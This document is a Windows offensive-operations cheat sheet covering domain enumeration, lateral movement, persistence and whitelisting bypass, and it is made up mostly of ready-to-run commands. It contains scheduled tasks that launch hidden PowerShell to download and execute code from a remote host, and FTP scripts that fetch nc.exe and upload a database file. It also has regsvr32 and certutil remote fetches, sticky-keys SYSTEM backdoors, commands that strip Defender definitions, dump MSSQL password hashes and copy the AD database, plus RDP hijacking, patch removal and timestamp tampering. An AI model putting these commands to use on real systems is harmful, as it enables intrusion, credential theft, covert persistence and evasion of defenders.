
# Windows

## Built-in Commands

View your current user:
```
	whoami
```

View information about the current user:
```
	net user myuser(for a local user)
	net user myuser /domain (for a domain user)
```

View the local groups:
```	
	net localgroup
```

View the local administrators:
```
	net localgroup Administrators
```

Add a new user:
```
	net user myuser mypass /add
```

Add a user in the local Administrators group:
```	
	net localgroup Administrators myuser /add
```

View the domain name of current machine:
```
	net config workstation
	net config server
```

View the name of the domain controller:	
```	
	reg query "HKEY_LOCAL_MACHINE\ SOFTWARE\Microsoft\Windows\ CurrentVersion\Group Policy\ History" /v DCName
```
or
```
    Import-Module ActiveDirectory; (Get-ADDomainController -DomainName corp.test.com -Discover -NextClosestSite).HostName
```
or
```
    set l
```

Get list of DCs
```
	nltest /dclist:domainname
```
or
```
    netdom query /D:domin DC
```
or
```
    dsquery server
```
or
```
    nslookup -type=srv _ldap._tcp.dc._msdcs.corp.test.com
```

Get DC Info
```
    nltest /dsgetdc:domain
```

Get DC site mapping
```
    nltest /dsaddresstosite:dcname.corp.test.com
```

Get PDC
```
    netdom query /D:domain PDC
```
or
```
    nslookup -type=srv _ldap._tcp.pdc._msdcs.corp.test.com
```
or get roles

Get Roles
```
    netdom query /D:domain FSMO
```

List trusts
```
nltest /domain_trust
```

or

```
nltest /trusted_domains
```

or

```
get-adtrust -Filter *
```

Get DC for Trusted Domains
```
$t=Get-AdTrust -Filter * |Select -expandproperty Name;foreach($line in $t){nltest /dclist:$line}
```

View the list of domain users:
```
	C:\> wmic useraccount where (domain='%USERDOMAIN%') get Name > userlist.txt

	PS C:\> ([adsisearcher]"objectCategory=User").Findall() | ForEach
	{$_.properties.samaccountname} | Sort | Out-File -Encoding ASCII users.txt
```
or
```
    net user /domain
```

Get domain info (including DC)
```
    gpresult /z
```

View the list of domain admins:
```
	net group "Domain Admins" /domain
```

View domain groups
```
	net group /domain
	powershell (new-object system.directoryservices.directorysearcher("(&(objectcategory=user)(samaccountname=$($env:username)))")).FindOne().GetDirectoryEntry().memberof
```

View the list of started services (search for antivirus):
```
	net start
	sc query
```

Stop a service:	
```
	net stop "Symantec Endpoint Protection"
```

View the list of started processes and the owner:
```	
	tasklist /v
```

Kill a process by its name:	
```	
	taskkill /F /IM "cmd.exe"
```

Abort a shutdown/restart countdown:	
```	
	shutdown /a
```

Download an executable from a remote FTP server:
```
	echo open 10.1.2.3> C:\script.txt
	echo user myftpuser>> C:\script.txt
	echo pass myftppass>> C:\script.txt
	echo get nc.exe>> C:\script.txt
	echo bye>> C:\script.txt
	ftp -s:script.txt
```

Upload a file to a remote FTP server:
```
	echo open 10.1.2.3> C:\script.txt
	echo user myftpuser>> C:\script.txt
	echo pass myftppass>> C:\script.txt
	echo put E:\backups\database.dbf>> C:\script.txt
	echo bye>> C:\script.txt
	ftp -s:script.txt
```

WMI call remote system
```
    wmic /node:remote_computer process call create "netstat.exe -ano > C:\output.txt"
```

WMI get startup items
```
    wmic startup get Caption, Command, User
```

or

```
    wmic startup list full
```

WMI get enabled account password expiration
```
    wmic useraccount where "disabled=0 AND localaccount=1" get name, passwordexpires /value
```

View established connections of current machine:
```
	netstat -a -n -p tcp | find "ESTAB"
```

View open ports of current machine:	
```
	netstat -a -n -p tcp | find "LISTEN"
```

```
	netstat -a -n -p udp
```

View network configuration:
```
	netsh interface ip show addresses
	netsh interface ip show route
	netsh interface ip show neighbors
```

View current network shares:
```	
	net share
```

Mount a remote share with the rights of the current user:
```
	net use K: \\10.1.2.3\C$
```

Enable Remote Desktop:
```	
	reg add "HKLM\System\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
```

One-Liner Windows Enumeration
Reference: https://gist.github.com/KyleHanslovan/cadf9737401b85422c84091855473eb7
```	
	whoami & hostname & ipconfig /all & net user /domain 2>&1 & net group /domain 2>&1 & net group "domain admins" /domain 2>&1 & net group "Exchange Trusted Subsystem" /domain 2>&1 & net accounts /domain 2>&1 & net user 2>&1 & net localgroup administrators 2>&1 & netstat -an 2>&1 & tasklist 2>&1 & sc query 2>&1 & systeminfo 2>&1 & reg query "HKEY_CURRENT_USER\Software\Microsoft\Terminal Server Client\Default" 2>&1 & net view & net view /domain & net user %USERNAME% /domain & nltest /dclist & gpresult /z
```


Check for unquoted service paths
```
	wmic service get name,displayname,pathname,startmode | findstr /i /v "c:\windows\\" | findstr /i /v """
```
or
```
	gwmi win32_service |Select pathname | Where {($_.pathname -ne $null)} | Where {-not $_.pathname.StartsWith("`"")} | Where {($_.pathname.Substring(0, $_.pathname.IndexOf(".") +4)) -match ".* .*"}
```


Change Windows Proxy Settings
```
	Command to enable proxy usage:

	reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings" /v ProxyEnable /t REG_DWORD /d 1 /f
	
	Command to disable proxy usage:

	reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings" /v ProxyEnable /t REG_DWORD /d 0 /f
	
	Command to change the proxy address:

	reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings" /v ProxyServer /t REG_SZ /d proxyserveraddress:proxyport /f
	
	Also, in this case, it is a per-user setting than a system-wide setting.
```

Mount a .win image remotely on target machine
```
	Dism /get-wiminfo /wimfile:z:\win7\Acme_Win7.wim 


	Boot Dir
	Dism /Mount-Wim /WimFile:z:\win7\Acme_Win7.wim /index:1 /MountDir:C:\windows\temp\offline

	C: Drive
	Dism /Mount-Wim /WimFile:z:\win7\Acme_Win7.wim /index:2 /MountDir:C:\windows\temp\offline

	Dism /UnMount-Wim /MountDir:C:\windows\temp\offline /discard
```

For loop example
```
    for /D %f in ("C:\Users\username\*") do dir %f
```

For loop, count lines
```
    for /R "C:\users\username\desktop" %f in (*) do find /c /v "" %f
```

Check if file is locked
```
    @echo off; 2>nul ( >>file.txt echo off) && (echo not locked) || (echo locked)
```

Lock a file for testing
```
    (>&2 pause) >> file.txt
```

### DSQUERY

Get attributes for all Windows hosts in the Domain
```	
dsquery * -filter "(&(objectclass=computer) (objectcategory=computer) (operatingSystem=Windows*))" -limit 0 |dsget computer -dn -samid -desc -loc >c:\windows\temp\computers.log
```

Get attributes for computers in a specific OU
```	
dsquery computer <OU=PUT OU HERE> -limit 0 |dsget computer -dn -samid -desc -l >c:\windows\temp\out.log
```

Get attributes for users in the specified OU
```
	dsquery user <OU=PUT OU HERE> -limit 0 |dsget user -dn -samid -display -desc -office -tel -email -title -hmdir -profile -loscr -mustchpwd -canchpwd -pwdneverexpires -disabled
```

Get DC
```
    dsquery server -forest
```
or
```
    dsquery server -o rdn -forest
```

Get Domain Functional Level
````
    dsquery * "DC=corp,DC=test,DC=com" -scope base -attr msDS-Behavior-Version ntMixedDomain
````

Get Forest Functional Level
````
    dsquery * "CN=Partitions,CN=Configuration,DC=corp,DC=test,DC=com" -scope base -attr msDS-Behavior-Version ntMixedDomain
````

### SQLCMD

List Databases
```
	sqlcmd -E -S localhost -Q "EXEC sp_databases;"
```

List Tables in Database
```
	sqlcmd -E -S localhost -Q "SELECT * FROM DatabaseName.information_schema.tables;" -W -w 999 -s"," -o "c:\windows\temp\RecruiterProd_MSCRM_tables.csv"
```

Retrieve table contents
```
	sqlcmd -E -S localhost -d DatabaseName -Q "SELECT * FROM SystemUserBase;" -W -w 999 -s"," -o "c:\windows\temp\RecruiterProd_MSCRM_userbase.csv"
```

Dump MSSQL Password Hashes
```	
	sqlcmd -E -S localhost -Q "SELECT name, password_hash FROM master.sys.sql_logins;"
```

### NTDSUTIL
Built-in utility to create backup copy of the AD database
```	
	ntdsutil "ac i ntds" "ifm" "create full c:\temp" q q
```

### Applocker
List Applocker's effective policy on the system
```
	Get-ApplockerPolicy -Effective
```

### Windows Defender

Remove definitions and disable AV protection (Useful when Powershell scripts are being blocked by Defender)
```
	c:\program files\windows defender\mpcmdrun.exe" -RemoveDefinitions -All Set-MpPreference -DisableIOAVProtection $true
```

### APPCMD

Get virtual directories in IIS
```
	c:\windows\system32\inetsrv\appcmd.exe list vdir /text:physicalpath
```

## Windows Lateral Movement

RDP Hijacking

If you have SYSTEM context on a host, you can assume the RDP sessions of other users without credentials using the tscon.exe command.

Gain access to cmd.exe to issue the tscon.exe command over RDP by creating a backdoor with Stickkeys or Utilman. Use scheduled tasks (as SYSTEM) or create a service to execute the desired command.

[RDP hijacking — how to hijack RDS and RemoteApp sessions transparently to move through an organisation](https://medium.com/@networksecurity/rdp-hijacking-how-to-hijack-rds-and-remoteapp-sessions-transparently-to-move-through-an-da2a1e73a5f6)
```
	# View RDP sessions on system your RDP'd to with administrative permissions
	# Locally
	quser

	# Remote
	quser /server:<servername>

	# Create a service that will swap your SESSIONNAME with the desired disconnected session 
	sc create sesshijack binpath= "cmd.exe /k tscon 1 /dest:rdp-tcp#XX" error= "ignore"

	# Start service
	net start sesshijack
	or
	sc start sesshijack
```

Linux to Windows Remoting

  - In windows run
```
    winrm set winrm/config/Service/Auth @{Basic="true"}
    winrm set winrm/config/Service @{AllowUnencrypted="true"}
```

  - In linux run
```
    $cred = Get-Credential
    Enter-PSSession -ComputerName 'winserver1' -Credential $cred -Authentication Basic
```

PowerShell Remoting over SSH
```
    Enter-PSSession -Hostname <IP or FQDN> -Username james -SSHTransport
```    

## Windows Persistence Methods

### Registry Keys

#### Modify registry keys
```	
	#Add a key/value
	reg add \\<systemname>\<KEY> /v "<value>"" /t <type (Binary,REG_SZ,etc)> /d <data>
	
	#Delete a key/value
	reg delete \\<systemname>\<KEY> /v "<value>"
```

#### Userinit Key
This key specifies what program should be launched right after a user logs into Windows. The default program for this key is C:\windows\system32\userinit.exe. Userinit.exe is a program that restores your profile, fonts, colors, etc for your user name. It is possible to add further programs that will launch from this key by separating the programs with a comma.
```	
	HKEY_LOCAL_MACHINE\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\Userinit
	HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\Userinit = (REG_SZ) C:\windows\system32\userinit.exe,c:\windows\badprogram.exe
```

#### Run Key
```	
	#System Wide
	HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
	HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce

	#Current Logged-On User Only
	HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
	HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce
```

#### List Image File Execution Options (Debugger file executed when the target file is run)
```	
	HKLM\Software\MS\WindowsNT\CurrentVersion\Image File Execution Options\notepad.exe\debugger(REG_SZ = cmd.exe)
```

#### AppInit_DLLs 
Load custom DLLs each time a program runs (If it loads USER32.dll).  This is checked by most AV!

This value corresponds to files being loaded through the AppInit_DLLs Registry value. The AppInit_DLLs registry value contains a list of dlls that will be loaded when user32.dll is loaded. As most Windows executables use the user32.dll, that means that any DLL that is listed in the AppInit_DLLs registry key will be loaded also. This makes it very difficult to remove the DLL as it will be loaded within multiple processes, some of which can not be stopped without causing system instability. The user32.dll file is also used by processes that are automatically started by the system when you log on. This means that the files loaded in the AppInit_DLLs value will be loaded very early in the Windows startup routine allowing the DLL to hide itself or protect itself before we have access to the system.
```
	HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Windows\AppInit_DLLs
```

#### No-reboot sethc/utilman option using a "debugger" key  

Navigate to HKLM\Software\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\
Make key called "sethc.exe"
Make a REG_SQ value called "Debugger"
Assign it "c:\windows\system32\cmd.exe" as the value
Hit SHIFT 5 times and get a shell as nt authority\system
```	
	reg add "\\hostname\HKLM\Software\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe" /v Debugger /t REG_SZ /d "c:\windows\system32\cmd.exe"
	reg add "\\hostname\HKLM\Software\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\utilman.exe" /v Debugger /t REG_SZ /d "c:\windows\system32\cmd.exe"
```

Remove the debugger key
```
	reg delete "\\hostname\HKLM\Software\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe" /f
	reg delete "\\hostname\HKLM\Software\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\utilman.exe" /f
```

### File Storage Locations

#### Startup Folders
```	
	#All Users - Windows XP
	C:\Documents and Settings\All Users\Start Menu\Programs\Startup

	#All Users - Windows Vista+
	C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup

	#User Profile - Windows XP
	C:\Documents and Settings\<USERNAME>\Start Menu\Programs\Startup

	#User Profile - Windows Vista+
	C:\Users\<USERNAME>\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup
```

#### SETHC/UTILMAN Replacement

Replace these binaries, may require a reboot to take effect
```
	%WINDIR%\System32\sethc.exe
	%WINDIR%\System32\utilman.exe
```

Hit shift 5 times = sethc.exe run by SYSTEM
Windows key + U = utilman.exe run by SYSTEM


#### Volume Shadow Copy (Restore Points)

Windows service that's constantly running - takes snapshots of system directories

Drop Malware -> Create VSC (ReadOnly) -> Delete Malware -> Use WMIC to run VSC of malware

Registry Key to Disable Volume Shadow Copy
```
	HKLM\System\CurrentControlSet\Control\BackupRestore\FilesNotToSnapshot
```

#### VSSADMIN - native windows utility
	
vssadmin create command only applies to Server OS (Win2k3,2008)  
```
	vssadmin list shadows  
	vssadmin create shadow /for=C:  
	wmic /node:DC1 /user:DOMAIN\domainadminsvc /password:domainadminsvc123 process call create "cmd /c vssadmin create shadow /for=C  
	mklink /D C:\VscAccess \\?\GLOBALROOT\Device\HardDiskVolumeShadowCopy1  
	copy \\?\GLOBALROOT\Device\HardDiskVolumeShadowCopy4\path\to\some\file e:\files  
```

#### Use WMIC process call to run an .exe from a Volume Shadow Copy
```
	wmic process call create \\.\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\windows\system32\evil.exe
```

This process will not show the imagename (executable filename) or commandline parameters in the task list.
The file cannot be individually deleted from the shadow copy once created. The entire shadow copy must be deleted to remove it.  
```
	root@kali:~# wmis -U DOMAIN\domainadminsvc%domainadminsvc123 //ServerName \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\system32\evil.exe  
	NTSTATUS: NT_STATUS_OK - Success
```

In Kali Linux you could use the WMIS package to do the same thing:
```
	wmis -U DOMAIN\domainadminsvc%domainadminsvc123 //ServerName \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\system32\evil.exe  
	NTSTATUS: NT_STATUS_OK - Success
```


### Task Scheduling

#### AT
Executes as system and must be an Admin to run it. Check groups with whoami /groups
```
	at 13:20 /interactive cmd
	
	net user \\target /user:Domain\user pass
	net time \\target
	at \\target 13:20 c:\temp\evil.bat
```

#### SCHTASKS
Any user can create a task

Schedule a binary to run with arguments	on system events
```	
	#On System Startup
	schtasks /create /TN OfficeUpdaterA /tr ""c:\evil32.exe" -k password -n services" /SC onstart /RU system /RL HIGHEST
	schtasks /create /TN OfficeUpdaterD /tr "\"c:\Program Files\evil32.exe\" -k password -n services" /SC onstart /RU system /RL HIGHEST
	
	#On User Login
	schtasks /create /TN OfficeUpdaterB /tr ""c:\evil32.exe" -k password -n services" /SC onlogon
	schtasks /create /TN OfficeUpdaterE /tr "\"c:\Program Files\evil32.exe\" -k password -n services" /SC onlogon	

	#On Idle
	schtasks /create /TN OfficeUpdaterC /tr ""c:\evil32.exe" -k password -n services" /SC onidle /i 30''''
	schtasks /create /TN OfficeUpdaterF /tr "\"c:\Program Files\evil32.exe\" -k password -n services" /SC onidle /i 60
```

Use the Powershell Web Delivery (Download and Execute) module in Metasploit 'exploit\windows\misc\psh_web_delivery'
```
	#(X86) - On User Login
	schtasks /create /tn OfficeUpdaterA /tr "c:\windows\system32\WindowsPowerShell\v1.0\powershell.exe -WindowStyle hidden -NoLogo -NonInteractive -ep bypass -nop -c 'IEX ((new-object net.webclient).downloadstring('''http://<ip address>/<uri>'''))'" /sc onlogon /ru System
 
	#(X86) - On System Start
	schtasks /create /tn OfficeUpdaterB /tr "c:\windows\system32\WindowsPowerShell\v1.0\powershell.exe -WindowStyle hidden -NoLogo -NonInteractive -ep bypass -nop -c 'IEX ((new-object net.webclient).downloadstring('''http://<ip address>/<uri>'''))'" /sc onstart /ru System
 
	#(X86) - On User Idle (30mins)
	schtasks /create /tn OfficeUpdaterC /tr "c:\windows\system32\WindowsPowerShell\v1.0\powershell.exe -WindowStyle hidden -NoLogo -NonInteractive -ep bypass -nop -c 'IEX ((new-object net.webclient).downloadstring('''http://<ip address>/<uri>'''))'" /sc onidle /i 30
 
	#(X64) - On User Login
	schtasks /create /tn OfficeUpdaterA /tr "c:\windows\syswow64\WindowsPowerShell\v1.0\powershell.exe -WindowStyle hidden -NoLogo -NonInteractive -ep bypass -nop -c 'IEX ((new-object net.webclient).downloadstring('''http://<ip address>/<uri>'''))'" /sc onlogon /ru System
 
	#(X64) - On System Start
	schtasks /create /tn OfficeUpdaterB /tr "c:\windows\syswow64\WindowsPowerShell\v1.0\powershell.exe -WindowStyle hidden -NoLogo -NonInteractive -ep bypass -nop -c 'IEX ((new-object net.webclient).downloadstring('''http://<ip address>/<uri>'''))'" /sc onstart /ru System
 
	#(X64) - On User Idle (30mins)
	schtasks /create /tn OfficeUpdaterC /tr "c:\windows\syswow64\WindowsPowerShell\v1.0\powershell.exe -WindowStyle hidden -NoLogo -NonInteractive -ep bypass -nop -c 'IEX ((new-object net.webclient).downloadstring('''http://192.168.95.195:8080/kBBldxiub6'''))'" /sc onidle /i 30
```

#### Additional Notes

Scheduled Tasks binary paths CANNOT contain spaces because everything after the first space in the path is considered to be a command-line argument. To workaround this behavior, enclose the /TR path parameter between backslash (\) AND quotation marks ("):

Delete scheduled task without prompting	
```	
	schtasks /delete /f /TN taskname
```

Detailed scheduled tasks listing
```	
	schtasks /query /V /FO list
```
	
View scheduled tasks log (for troubleshooting)
```	
	notepad c:\windows\schedlgu.txt (Windows XP)

	notepad c:\windows\tasks\schedlgu.txt (Vista+)
	
```

### Windows Service
```
	sc query
	sc create <\\Target(optional)> <servicename> binPath= <service binary path> type= share start= auto DisplayName= <display name>
	sc delete <servicename>
```

### DLL-Hijacking

Order of DLL Loading
```
1. The directory from which the application is loaded
2. The current directory
3. The system directory, usually C:\\Windows\\System32\\ (The GetSystemDirectory function is called to obtain this directory.)
4. The 16-bit system directory - There is no dedicated function to retrieve the path of this directory, but it is searched as well.
5. The Windows directory. The GetWindowsDirector function is called to obtain this directory.
6. The directories that are listed in the PATH environment variable.
```

Many systems use bginfo (seen it a lot in operational sys). Drop Riched32.dll in the dir with bginfo.exe. Codex.

Older list of dlls as well (2010). https://www.exploit-db.com/dll-hijacking-vulnerable-applications/

On Windows 7 there are three executables that could be exploited and associated DLLs listed below
```	
	C:\windows\ehome\Mcx2Prov.exe
	C:\Windows\ehome\CRYPTBASE.dll

	C:\windows\System32\sysprep\sysprep.exe
	C:\Windows\System32\sysprep\CRYPTSP.dll
	C:\windows\System32\sysprep\CRYPTBASE.dll
	C:\Windows\System32\sysprep\RpcRtRemote.dll
	C:\Windows\System32\sysprep\UxTheme.dll

	C:\windows\System32\cliconfg.exe
	C:\Windows\System32\NTWDBLIB.DLL
```

On Windows 8 there are also three executables that could be exploited and associated DLLs listed below
```	
	C:\windows\System32\sysprep\sysprep.exe
	C:\windows\System32\sysprep\CRYPTBASE.dll
	C:\Windows\System32\Sysprep\dwmapi.dll
	C:\Windows\System32\Sysprep\SHCORE.dll

	C:\windows\System32\cliconfg.exe
	C:\Windows\System32\NTWDBLIB.DLL

	C:\windows\System32\pwcreator.exe
	C:\Windows\System32\vds.exe
	C:\Windows\System32\UReFS.DLL
```

Windows 8.1 there are also three executables that could be exploited and associated DLLs listed below
```
	C:\windows\System32\sysprep\sysprep.exe
	C:\Windows\System32\Sysprep\SHCORE.dll
	C:\Windows\System32\Sysprep\OLEACC.DLL

	C:\windows\System32\cliconfg.exe
	C:\Windows\System32\NTWDBLIB.DLL

	C:\windows\System32\pwcreator.exe
	C:\Windows\System32\vds.exe
	C:\Program Files\Common Files\microsoft shared\ink\CRYPTBASE.dll
	C:\Program Files\Common Files\microsoft shared\ink\CRYPTSP.dll
	C:\Program Files\Common Files\microsoft shared\ink\dwmapi.dll
	C:\Program Files\Common Files\microsoft shared\ink\USERENV.dll
	C:\Program Files\Common Files\microsoft shared\ink\OLEACC.dll
```

#### linkinfo.dll Replacement

Windows explorer in older systems loads linkinfo.dll from c:\windows over c:\windows\system32 if it exists
```
	copy evil.dll c:\windows\linkinfo.dll
```

### WMI Event Persistence via Powershell
WMI Event persistence explained, you can find a bloated version in powersploit.
Three parts to this: 
* WMI Event Filter
* Event Consumer
* Filter/Consumer Binding
This technique gets you *SYSTEM* level persistence, requires admin rights to execute.
Autoruns doesn't even check for this yet. (doubt any AVs are either)
Difficult to detect, Difficult to remove if you dont know what youre doing.
#### WMI Event Filter
Create an event that checks every 60 seconds for a change in Win32_PerfFormattedData_PerfOS_System. (this is always changing)

```    
    $EventFilter = ([WMICLASS]"\\.\root\subscription:__EventFilter").CreateInstance() 
    $EventFilter.QueryLanguage  = "WQL" 
    $EventFilter.Query          = "SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System' AND TargetInstance.SystemUpTime >= 240 AND TargetInstance.SystemUpTime < 325" 
    $EVentFilter.EventNamespace = "root\cimv2" 
    $EventFilter.Name           = "OBVIOUSHACKER" 
    $Result = $EventFilter.Put() 
    $Filter = $Result.Path
```

http://msdn.microsoft.com/en-us/library/aa394639(v=vs.85).aspx

#### Event Consumer
Configure what to execute once the event occurs.
Current example is just a ping.

```
    $InstanceConsumer = ([wmiclass]"\\.\root\subscription:CommandLineEventConsumer").CreateInstance() 
    $InstanceConsumer.Name = "OBVIOUSHACKER" 
    $InstanceConsumer.CommandLineTemplate = "ping 127.0.0.1 -n 100"          #CMD TO EXECUTE HERE
    $InstanceConsumer.WorkingDirectory = "C:\\windows\\system32"
    $Result = $InstanceConsumer.Put() 
    $Consumer = $Result.Path
```

http://msdn.microsoft.com/en-us/library/aa389231(v=vs.85).aspx
http://msdn.microsoft.com/en-us/library/aa393649(v=vs.85).aspx

#### Filter/Consumer Binding
This is the object that correlates the Filter with the Consumer.
Runs as system as a child of WmiPrvSE.exe under the svchost.exe running Dcom service.

```
    $InstanceBinding = ([wmiclass]"\\.\root\subscription:__FilterToConsumerBinding").CreateInstance() 
    $InstanceBinding.Filter   = $Filter
    $InstanceBinding.Consumer = $Consumer
    $Result = $InstanceBinding.Put() 
```

http://msdn.microsoft.com/en-us/library/aa394647(v=vs.85).aspx

#### REMOVAL
The filter name would change depending on what you call the wmi event on your target (OBVIOUSHACKER shown as the example)

```
    Get-WmiObject __eventFilter -namespace root\subscription -filter "name='OBVIOUSHACKER'"| Remove-WmiObject
    Get-WmiObject CommandLineEventConsumer -Namespace root\subscription -filter "name='OBVIOUSHACKER'" | Remove-WmiObject
    Get-WmiObject __FilterToConsumerBinding -Namespace root\subscription | Where-Object { $_.filter -match 'OBVIOUSHACKER'} | Remove-WmiObject
```
[Some more detailed information on the subject](http://www.exploit-monday.com/2013/04/PersistenceWithPowerShell.html)


http://www.bleepingcomputer.com/tutorials/windows-program-automatic-startup-locations/


### Malicious Outlook Rules

* https://labs.mwrinfosecurity.com/blog/malicous-outlook-rules/
* Ruler
 - https://github.com/sensepost/ruler

### Windows Remote Management (WinRM) / PSRemoting

* Listens on 5985/5986 by default and allows interactive shell access over HTTP/S
* Find by scanning for /wsman and looking for HTTP 402 errors (or use Metasploit module)
* Metasploit has multiple modules for locating the service and gaining shells over WinRM

*Connect to a remote host with WinRM from local Windows host*
```
	Enable-PSRemoting
	Set-Item -Path WSMan:\localhost\Client\TrustedHosts * -force
	or 
	Set-Item -Path WSMan:\localhost\Client\TrustedHosts -value "<host>" -Force
	$cred = Get-Credential
	Invoke-Command -ComputerName <host> -ScriptBlock { gci c:\ } -credential $cred
```

### Uninstall a patch to leave the system vulnerable
```	
	wusa.exe /uninstall /kb:976932
```

### Create custom DLL for password filters and install on DC to capture changed passwords  
* http://carnal0wnage.attackresearch.com/2013/09/stealing-passwords-every-time-they.html

#### Set File Timestamps
```
Function Set-FileTimeStamps
{
 Param (
    [Parameter(mandatory=$true)]
    [string[]]$path,
    [datetime]$date = (Get-Date))
    Get-ChildItem -Path $path |

    ForEach-Object {
     $_.CreationTime = $date
     $_.LastAccessTime = $date
     $_.LastWriteTime = $date }
} #end function Set-FileTimeStamps
```

## Application Whitelisting Bypass Techniques

[SubTee Collection of Whitelist Bypass Techniques ](https://github.com/subTee/ApplicationWhitelistBypassTechniques/blob/master/TheList.txt)
https://bitbucket.org/jsthyer/wevade.git

Version .0.0.3
```
1. IEExec -This technique may work in certain environments.  Its relies on the fact that many organizations trust executables signed
by Microsoft.  We can misuse this trust by launching a specially crafted .NET application. 
Example Here: https://room362.com/post/2014/2014-01-16-application-whitelist-bypass-using-ieexec-dot-exe/

2.  Rundll32.exe

3.  ClickOnce Applications dfsvc.exe dfshim.dll

4.  XBAP - XML Browser Applications WPF PresentationHost.exe

5.  MD5 Hash Collision 
http://www.mathstat.dal.ca/~selinger/md5collision/

6.  PowerShell - Specifically Reflective Execution
http://clymb3r.wordpress.com/2013/04/06/reflective-dll-injection-with-powershell/
https://www.defcon.org/images/defcon-21/dc-21-presentations/Bialek/DEFCON-21-Bialek-PowerPwning-Post-Exploiting-by-Overpowering-Powershell.pdf

7. .HTA Application Invoke PowerShell Scripts
    Launched by mshta.exe, bypasses IE security settings as well.

8.  bat, vbs, ps1
    1. cmd.exe /k < script.txt
    2. cscript.exe //E:vbscript script.txt
    3. Get-Content script.txt | iex
    
9. Malicious Troubleshooting packs - MSDT.exe
    Reference: http://cybersyndicates.com/2015/10/a-no-bull-guide-to-malicious-windows-trouble-shooting-packs-and-application-whitelist-bypass/
    Thanks to @nberthaume, @Killswitch_GUI 
    
10. InstallUtil.exe
    A signed MS binary that loads assemblies and executes - One of the best.
    Examples here: https://gist.github.com/subTee

11. Regsvcs/Regasm
    See: https://gist.github.com/subTee/fb09ef511e592e6f7993
    These 2 are Excellent.

12. regsvr32.exe 
    https://gist.github.com/subTee/24c7d8e1ff0f5602092f58cbb3f7d302
    This one is just simply amazing... 
    regsvr32 /s /n /u /i:http://example.com/file.sct scrobj.dll

13. Msbuild.exe
    http://subt0x10.blogspot.com/2016/09/bypassing-application-whitelisting.html
```

## Certutil

https://gist.github.com/subTee/7937a8ef07409715f15b84781e180c46
	
File download 
```
	certutil -urlcache -split -f http://example.com/file 
```

## Active Directory Enumeration

### Adfind

www.joeware.net/freetools/tools/adfind/
```
	AdFind.exe -u account@domain.com -up password -h 10.4.128.40:389 -b dc=domain,dc=com -f "objectcategory=computer" > domain_computers.txt

	AdFind.exe -u account@domain.com -up password -h 10.4.128.40:389 -b dc=domain,dc=com -f "objectcategory=computer" distinguishedName dNSHostName description whenchanged operatingSystem operatingSystemVersion > domain_computers_light.txt

	AdFind.exe -u account@domain.com -up pass -h 10.4.128.40:389 -b dc=domain,dc=com -f "objectcategory=user" samaccountname description pwdlastset orclcommonattribute > domain_users_light.txt
```
